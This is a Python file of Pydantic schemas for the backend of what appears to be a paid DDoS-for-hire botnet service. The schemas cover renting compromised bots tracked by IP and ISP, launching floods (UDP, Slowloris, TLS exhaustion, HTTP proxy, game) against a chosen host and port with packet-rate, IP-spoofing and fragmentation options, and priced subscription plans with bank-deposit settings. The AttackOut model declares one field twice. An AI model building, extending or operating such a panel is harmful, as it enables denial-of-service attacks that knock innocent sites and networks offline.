from pydantic import BaseModel, EmailStr, Field, field_validator, ConfigDict
from typing import Optional, List, Any
from datetime import datetime
from uuid import UUID

def _as_str(v: Any) -> Optional[str]:
    if v is None: return None
    return str(v)

class LoginRequest(BaseModel):
    username: str
    password: str

class LoginResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    user_id: str
    role: str

class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=64)
    email: EmailStr
    password: str = Field(..., min_length=6)

class UserOut(BaseModel):
    model_config = ConfigDict(from_attributes=True)
    id: str
    username: str
    email: Optional[str] = None
    role: str
    is_banned: bool = False
    created_at: Optional[datetime] = None

    @field_validator("id", mode="before")
    @classmethod
    def id_str(cls, v): return _as_str(v)

class BotOut(BaseModel):
    model_config = ConfigDict(from_attributes=True)
    id: str
    bot_identifier: str
    nickname: Optional[str] = None
    ip_address: Optional[str] = None
    country: Optional[str] = None
    isp: Optional[str] = None
    os_name: Optional[str] = None
    cpu_cores: Optional[int] = None
    ram_total_mb: Optional[int] = None
    net_speed_mbps: Optional[int] = None
    status: str = "offline"
    is_rented: bool = False
    rented_by_user_id: Optional[str] = None
    max_pps: int = 100000
    max_mbps: int = 500
    max_threads: int = 100
    enabled_methods: List[str] = []
    spoof_mode: int = 0
    fragmentation: bool = False
    last_heartbeat_at: Optional[datetime] = None
    first_seen_at: Optional[datetime] = None
    bot_version: Optional[str] = None

    @field_validator("id", "rented_by_user_id", mode="before")
    @classmethod
    def uuid_str(cls, v): return _as_str(v)

    @field_validator("ip_address", mode="before")
    @classmethod
    def ip_str(cls, v): return _as_str(v) if v is not None else None

    @field_validator("enabled_methods", mode="before")
    @classmethod
    def methods_list(cls, v): return list(v) if v else []

class BotToggle(BaseModel):
    enabled: bool

class BotAssign(BaseModel):
    user_id: str
    duration_hours: int = 24

class BotThrottle(BaseModel):
    max_pps: Optional[int] = None
    max_mbps: Optional[int] = None
    max_threads: Optional[int] = None
    enabled_methods: Optional[List[str]] = None
    spoof_mode: Optional[int] = None
    fragmentation: Optional[bool] = None

class AttackCreate(BaseModel):
    target_host: str
    target_port: int = Field(..., ge=1, le=65535)
    method: str = Field(default="MEGA", pattern="^(MEGA|UDP|TLS_EXHAUST|HTTP|SLOWLORIS|HTTP_PROXY|GAME)$")
    duration_secs: int = Field(default=60, ge=1, le=3600)
    pps_per_bot: int = Field(default=100000, ge=1, le=100000000)
    bot_count: int = Field(default=1, ge=1, le=100)
    spoof_mode: int = Field(default=0, ge=0, le=2)
    fragmentation: bool = False
    slowloris: bool = False
    tls_exhaust: bool = False
    mega_mode: bool = False
    payload: Optional[str] = None    # base64 game payload for GAME method
    proxies: Optional[str] = None    # proxy list ip:port, one per line

class AttackOut(BaseModel):
    model_config = ConfigDict(from_attributes=True)
    id: str
    user_id: str
    target_host: str
    target_port: int
    method: str
    duration_secs: int
    pps_per_bot: int = 100000
    spoof_mode: int = 0
    fragmentation: bool = False
    slowloris: bool = False
    tls_exhaust: bool = False
    mega_mode: bool = False
    mega_mode: bool = False
    status: str = "pending"
    bot_ids: List[str] = []
    total_packets: int = 0
    total_bytes: int = 0
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None

    @field_validator("id", "user_id", mode="before")
    @classmethod
    def uuid_str(cls, v): return _as_str(v)

    @field_validator("bot_ids", mode="before")
    @classmethod
    def bot_ids_str(cls, v):
        if not v: return []
        return [str(x) for x in v]

class DashboardStats(BaseModel):
    total_bots: int
    online_bots: int
    rented_bots: int
    active_attacks: int
    total_users: int
    total_packets: int
    total_bandwidth_gb: float

class PaginatedResponse(BaseModel):
    items: List[Any]
    total: int
    page: int
    per_page: int
    pages: int

# ── Plan CRUD ──
class PlanCreate(BaseModel):
    name: str
    slug: str
    description: Optional[str] = None
    max_bots: int = 1
    max_concurrent: int = 1
    max_attack_secs: int = 120
    cooldown_secs: int = 300
    max_pps_per_bot: int = 500000
    allowed_methods: List[str] = ["MEGA","TLS_EXHAUST","HTTP","SLOWLORIS","HTTP_PROXY","GAME","UDP"]
    price_vnd: int = 10000
    price_usd: float = 0.5
    is_active: bool = True

class PlanUpdate(BaseModel):
    name: Optional[str] = None
    slug: Optional[str] = None
    description: Optional[str] = None
    max_bots: Optional[int] = None
    max_concurrent: Optional[int] = None
    max_attack_secs: Optional[int] = None
    cooldown_secs: Optional[int] = None
    max_pps_per_bot: Optional[int] = None
    allowed_methods: Optional[List[str]] = None
    price_vnd: Optional[int] = None
    price_usd: Optional[float] = None
    is_active: Optional[bool] = None

class PlanOut(BaseModel):
    model_config = ConfigDict(from_attributes=True)
    id: UUID
    name: str
    slug: str
    description: Optional[str] = None
    max_bots: int
    max_concurrent: int
    max_attack_secs: int
    cooldown_secs: int
    max_pps_per_bot: int
    allowed_methods: List[str]
    price_vnd: int
    price_usd: float
    is_active: bool
    created_at: Optional[datetime] = None

# ── Site Settings ──
class SettingsUpdate(BaseModel):
    site_name: Optional[str] = None
    site_url: Optional[str] = None
    telegram_bot_username: Optional[str] = None
    bank_account_name: Optional[str] = None
    bank_account_number: Optional[str] = None
    bank_name: Optional[str] = None
    bank_bin: Optional[str] = None
    min_deposit: Optional[int] = None
    maintenance_mode: Optional[bool] = None

class SettingsOut(BaseModel):
    site_name: str
    site_url: str
    telegram_bot_username: str
    bank_account_name: str
    bank_account_number: str
    bank_name: str
    bank_bin: str
    min_deposit: int
    maintenance_mode: bool
